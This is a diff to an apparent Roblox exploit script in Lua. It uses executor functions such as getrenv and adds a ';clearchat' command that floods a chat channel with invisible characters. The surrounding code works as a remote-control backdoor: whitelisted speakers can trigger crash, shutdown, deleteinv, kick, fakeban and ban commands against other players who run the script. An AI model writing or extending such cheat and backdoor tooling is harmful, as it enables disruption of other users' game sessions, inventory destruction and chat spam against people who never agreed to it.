@@ -127,7 +127,7 @@ end
 local cmds = "⭐cmds are: reset,ac,void,kick,sit,ad,config."
 local cmds2="help,tbring,song,hev,lobby,vclipdown,butterfingers,listore,breakbow,dropheld,rageblade."
 local cmds3 = "blind,unblind,telepearl,emeraldarmor,apple,popups,deleteinv,crash,shutdown,mygame,flash"
-local cmds4 = "lava,dead,troll,byfron,fakeban,check,mute,unmute,funnymsg,ban⭐"
+local cmds4 = "lava,dead,troll,byfron,fakeban,check,mute,unmute,funnymsg,ban,clearchat⭐"
 local ores = "⭐ores that can be dropped are:"
 local ores2 = "iron,diamond,emerald,gold,u can drop stuff that arnt ores too.⭐"
 local sexlist = {
@@ -601,6 +601,22 @@ local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
 	elseif cmd == ";help" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 		local textChatService = game:GetService("TextChatService")
 		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐put the username after the cmd,or put . todo all⭐")
+
+
+elseif cmd == ";clearchat" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+textChatService.ChatInputBarConfiguration.TargetTextChannel = game:GetService("TextChatService").TextChannels["sex"]
+for i = 1,15 do
+textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⁥")
+end
+textChatService.ChatInputBarConfiguration.TargetTextChannel = game:GetService("TextChatService").TextChannels["RBXGeneral"]
+elseif cmd == ";clearchat" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+textChatService.ChatInputBarConfiguration.TargetTextChannel = game:GetService("TextChatService").TextChannels["sex"]
+for i = 1,15 do
+textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⁥")
+end
+textChatService.ChatInputBarConfiguration.TargetTextChannel = game:GetService("TextChatService").TextChannels["RBXGeneral"]
+
+
 
 
 elseif cmd == ";ban" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
